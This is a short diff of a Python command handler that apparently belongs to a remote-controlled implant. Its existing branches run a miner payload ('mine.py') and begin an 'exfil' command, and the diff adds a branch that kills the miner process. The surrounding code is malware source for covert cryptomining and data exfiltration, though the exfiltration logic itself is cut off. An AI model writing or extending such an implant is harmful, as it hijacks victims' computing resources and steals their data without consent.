@@ -101,6 +101,9 @@ def handle_trigger(cmd):
     elif cmd == "trigger_mine":
         return run_payload("mine.py")
 
+    elif cmd == "trigger_stopmine":
+        return subprocess.getoutput("pgrep -f mine.py && pkill -f mine.py || echo '[-] No miner running.'")
+
     elif cmd.startswith("trigger_exfil"):
         parts = cmd.split(" ", 1)
         if len(parts) != 2:
